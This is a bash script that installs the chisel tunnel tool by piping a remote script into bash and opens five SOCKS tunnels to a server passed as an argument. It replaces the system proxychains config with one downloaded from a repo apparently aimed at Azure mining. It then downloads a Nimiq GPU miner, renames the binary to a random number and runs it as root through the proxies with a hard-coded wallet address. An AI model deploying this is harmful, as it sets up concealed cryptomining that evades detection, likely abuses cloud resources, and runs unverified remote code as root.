pkill chisel
curl https://i.jpillora.com/chisel! | bash 
port1=$RANDOM
port2=$RANDOM
port3=$RANDOM
port4=$RANDOM
port5=$RANDOM
./chisel client --keepalive 90m $1 $port1:socks $port2:socks $port3:socks $port4:socks $port5:socks&
pgrep -x "chisel" || chisel client --keepalive 90m  $1 $port1:socks $port2:socks $port3:socks $port4:socks $port5:socks&
apt install proxychains
wget https://raw.githubusercontent.com/Vinhuit/azurenimpool/master/azure_script/pchain.conf -O pchain.conf
cp -rf pchain.conf /etc/proxychains.conf
sed -i "s/9050/${port1}/g"  /etc/proxychains.conf
sed -i "s/9051/${port2}/g"  /etc/proxychains.conf
sed -i "s/9052/${port3}/g"  /etc/proxychains.conf
sed -i "s/9053/${port4}/g"  /etc/proxychains.conf
sed -i "s/9054/${port5}/g"  /etc/proxychains.conf
sleep 10
#sed -i 's/proxy_dns/#proxy_dns/g'  /etc/proxychains.conf
sudo proxychains curl ifconfig.me
wget https://github.com/tomkha/nq-miner/releases/download/0.99.6/nq-miner-linux-0.99.6.tar.gz && tar xvzf nq-miner-linux-0.99.6.tar.gz
name=$RANDOM
mv nq-miner $name && sudo proxychains ./$name -t cuda -a "NQ56 JVMC 03YP S4DY NU9C 4VER JER8 EJY1 JX9U" -p $2 $3
